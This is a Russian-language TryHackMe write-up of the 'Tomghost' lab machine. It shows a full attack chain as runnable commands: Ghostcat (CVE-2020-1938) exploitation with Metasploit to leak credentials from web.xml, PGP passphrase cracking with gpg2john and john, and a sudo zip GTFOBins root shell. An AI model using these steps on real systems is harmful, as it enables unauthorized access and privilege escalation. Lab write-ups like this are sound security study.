# Tomghost - TryHackMe

**Сложность:** Easy  
**Дата:** Октябрь 2026

---

## С чего начал

Запустил nmap чтобы посмотреть что открыто:

```bash
nmap -sV -sC -Pn 10.112.166.110
```

Нашёл четыре порта - SSH, DNS, AJP и Apache Tomcat. 
Сразу обратил внимание на порт 8009 - это AJP коннектор 
Apache Tomcat 9.0.30. Именно эта версия уязвима к Ghostcat.

---

## Эксплуатация Ghostcat (CVE-2020-1938)

Ghostcat - уязвимость в протоколе AJP старых версий Tomcat. 
Позволяет читать файлы с сервера без аутентификации.

Использовал Metasploit:

```bash
msfconsole
search ghostcat
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.112.166.110
run
```

Модуль прочитал файл web.xml и нашёл там credentials:skyfuck:8730281lkjlkjdqlksalks


---

## Первоначальный доступ

Зашёл по SSH с найденными данными:

```bash
ssh skyfuck@10.112.166.110
```

В домашней папке нашёл два файла - tryhackme.asc и credential.pgp. 
Первый это PGP ключ, второй зашифрованный файл с credentials.

---

## Взлом PGP ключа

Скачал файлы на свою машину:

```bash
scp skyfuck@10.112.166.110:/home/skyfuck/tryhackme.asc ~/Downloads/
scp skyfuck@10.112.166.110:/home/skyfuck/credential.pgp ~/Downloads/
```

Конвертировал PGP ключ в формат для john и взломал пароль:

```bash
gpg2john tryhackme.asc > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Нашёл пароль от ключа. Расшифровал файл:

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

Получил credentials пользователя merlin.

---

## Переключение на merlin и user флаг

```bash
su merlin
cat /home/merlin/user.txt
```

---

## Privilege Escalation до root

Проверил sudo права:

```bash
sudo -l
```

Merlin может запускать zip от root без пароля. 
Нашёл на GTFOBins как использовать zip для получения root shell:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

Получил root shell и забрал финальный флаг:

```bash
cat /root/root.txt
```

---

## Что узнал из этой машины

Всегда проверять версии сервисов через nmap - старый Tomcat 
сразу выдал уязвимость. Файлы конфигурации типа web.xml часто 
содержат пароли в открытом виде. Слабые пароли на PGP ключах 
легко взламываются через john. GTFOBins - обязательный ресурс 
для privilege escalation.

---

## Инструменты

nmap, Metasploit, scp, gpg2john, john, GTFOBins
